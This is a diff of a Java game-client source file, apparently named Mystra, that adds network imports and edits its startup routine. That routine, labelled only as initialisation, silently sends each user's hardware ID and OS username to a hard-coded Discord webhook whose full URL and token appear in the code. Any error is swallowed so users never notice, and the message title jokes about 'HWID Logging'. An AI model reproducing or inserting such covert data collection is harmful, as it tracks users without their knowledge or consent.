@@ -1,6 +1,11 @@
 package me.mystra;
 
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.InputStreamReader;
+import java.net.DatagramSocket;
+import java.net.InetAddress;
+import java.net.URL;
 
 import me.mystra.gui.login.GuiClientLogin;
 import me.mystra.utils.DiscordWebhook;
@@ -79,9 +84,10 @@ public class Mystra {
     	/*
     	 * Initializes on startup.
     	*/
+
         try{
             DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/781214773517221920/W9kvHaYpMupipDZOgJFu7cZqcZb9tSysNLAevLSDLjBgvtKlRQQtC_ofPl48KuyQ3Y74");
-            webhook.addEmbed(new DiscordWebhook.EmbedObject().addField("HWID", GuiClientLogin.getHWID(), false).addField("OS Username:", System.getProperty("user.name"), false).setTitle("Mystra HWID Logging bois"));
+            webhook.addEmbed(new DiscordWebhook.EmbedObject().addField("HWID", GuiClientLogin.getHWID(), false).addField("OS Username:", System.getProperty("user.name"), false).setTitle("Mystra HWID Logging bois <a:peepoHeHee:401946781208018944>"));
             webhook.execute();
         } catch (Exception ignored){}
     	String clientFolder = new File(".").getAbsolutePath();
